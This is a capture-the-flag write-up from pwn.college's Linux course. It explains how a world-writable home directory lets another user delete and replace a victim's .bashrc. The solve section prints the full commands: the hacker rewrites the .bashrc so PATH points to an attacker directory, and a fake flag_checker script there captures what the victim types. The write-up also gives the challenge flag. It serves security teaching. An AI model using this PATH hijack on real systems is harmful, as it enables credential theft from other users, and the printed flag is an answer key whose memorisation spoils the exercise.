# Linux Luminarium
# Module 15: Silly Sehnanigans

## Overshared Directories
Alright, Zardus has wised up --- why would he have a writable .bashrc, anyways? But a more common scenario is that users on the same system, to make it easier to collaborate, will make their home directories world writable. What's the problem here?

The problem is that a subtlety of Linux file/directory permissions is that anyone with write access to a directory can move and delete files in it. For example, let's say that Zardus has a world-writable directory for collaboration:

```
zardus@dojo:~$ mkdir /tmp/collab
zardus@dojo:~$ chmod a+w /tmp/collab
zardus@dojo:~$ echo "do pwn.college" > /tmp/collab/todo-list
```
And then a hacker comes along and does the following, despite not owning the todo-list file!

```
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 zardus zardus 15 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$ rm /tmp/collab/todo-list
rm: remove write-protected regular file '/tmp/collab/todo-list'? y
hacker@dojo:~$ echo "send hacker money" > /tmp/collab/todo-list
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 hacker hacker 18 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$
```
This might seem counterintuitive: hacker has no write access to the todo-list but the end result is that they can change the content. But think about it this way: a file's connection to a directory lives in the directory in the end, and users with write access to that directory can mess with it. Of course, this has security implications when important directories are world-writable.

In this challenge, for convenience, Zardus opened up his home directory:

```
zardus@dojo:~$ chmod a+w /home/zardus
```
As you know, there are lots of sensitive files in that directory such as .bashrc! Can you replicate the previous attack with write access to /home/zardus instead of /home/zardus/.bashrc?

### Solve
**Flag:** `pwn.college{0h9F6SazsfeTSAuGRB3FWhFfB18.0FM0EzNxwiNyUDN0EzW}`

This challenge built on the previous .bashrc attack but introduced a more realistic vulnerability. Instead of having write access directly to /home/zardus/.bashrc, the challenge granted write access to the entire /home/zardus directory. Because write permission on a directory allows files inside it to be deleted and recreated, the original .bashrc was removed and replaced with a malicious version. A fake flag_checker program was then created and placed in a directory controlled by the attacker. The replacement .bashrc modified PATH so that the attacker's version of flag_checker was found before the legitimate one. When Zardus logged in and executed flag_checker, the fake program captured and displayed the flag that he manually entered.

```bash
hacker@shenanigans~overshared-directories:~$ ls -la /home/zardus/.bashrc
-rw-r--r-- 1 zardus zardus 148 Jun 15 16:02 /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ rm /home/zardus/.bashrc
rm: remove write-protected regular file '/home/zardus/.bashrc'? y
hacker@shenanigans~overshared-directories:~$ mkdir ~/evil
hacker@shenanigans~overshared-directories:~$ nano ~/evil/flag_checker
(#!?bin/bash
echo "Type the flag"
cat)
hacker@shenanigans~overshared-directories:~$ chmod +x ~/evil/flag_checker
hacker@shenanigans~overshared-directories:~$ rm /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ echo 'PATH=/home/hacker/evil:$PATH' > /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ /challenge/victim
Username: zardus
zardus@shenanigans~overshared-directories:~$ ***********
-bash: 2323011838: command not found
zardus@shenanigans~overshared-directories:~$ flag_checker

Type the flag
*************************************************************pwn.college{0h9F6SazsfeTSAuGRB3FWhFfB18.0FM0EzNxwiNyUDN0EzW}
```

### New Learnings
Learned that write permission on a directory is often more dangerous than write permission on an individual file. Even without permission to modify a file directly, a user who can write to the containing directory can delete the original file and replace it with a malicious version. This challenge demonstrated how insecure directory permissions can enable privilege abuse, persistence, and command hijacking attacks. It also reinforced how PATH manipulation can redirect users to attacker-controlled executables without requiring modifications to the target program itself.